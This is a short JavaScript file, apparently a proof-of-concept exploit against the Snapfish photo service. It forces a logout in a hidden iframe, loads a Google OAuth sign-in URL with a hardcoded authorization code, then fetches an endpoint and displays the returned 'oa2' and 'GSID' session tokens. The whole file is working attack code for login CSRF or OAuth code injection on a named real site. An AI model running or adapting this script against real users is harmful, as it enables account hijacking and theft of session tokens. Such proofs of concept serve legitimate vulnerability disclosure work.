// Create a new iframe element
const iframe = document.createElement('iframe');

// Set attributes for the iframe
function logout(){
iframe.src = 'https://www.snapfish.com/logout';  // Replace with the desired URL
iframe.width = '600';  // Width of the iframe
iframe.height = '400';  // Height of the iframe
iframe.frameBorder = '0';  // Optional: removes the border
iframe.allowfullscreen = true;  // Optional: allows full-screen mode

// Append the iframe to the body (or any other container)
document.body.appendChild(iframe);

}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


async function example() {
  logout()
  await sleep(1000);  // Sleep for 2 seconds (2000 ms)
  iframe.src = 'https://www.snapfish.com/v1/gw/snapfish/oauth/google/signin?TNCFlag=1&context=/hp/sf/sf-us/snapfish-us&sourceGroup=sf-store&code=616693709344187&next=https%3A%2F%2Fwww.snapfish.com%2Floginto%3Fnext%3Dhttps%253A%252F%252Fwww.snapfish.com%252Flibrary%252Fprojects%253Flredirect_2%253Dtrue%2526website%253Dsnapfish_us%2526cobrand%253Dsnapfish%2526locale%253Den_US&SubscriptionFlag=ALL';  // Replace with the desired URL
iframe.width = '600';  // Width of the iframe
iframe.height = '400';  // Height of the iframe
iframe.frameBorder = '0';  // Optional: removes the border
iframe.allowfullscreen = true;  // Optional: allows full-screen mode

// Append the iframe to the body (or any other container)
document.body.appendChild(iframe);

await sleep(3000);  // Sleep for 2 seconds (2000 ms)

fetch('https://www.snapfish.com/library/getOauthInfo', {
  method: 'GET'
})
  .then(res => res.json())
  .then(data => {
    alert(data.oauthInfo.oa2);
    alert(data.oauthInfo.GSID);
  })
  .catch(err => console.error('Fetch error:', err));


  

}

example();
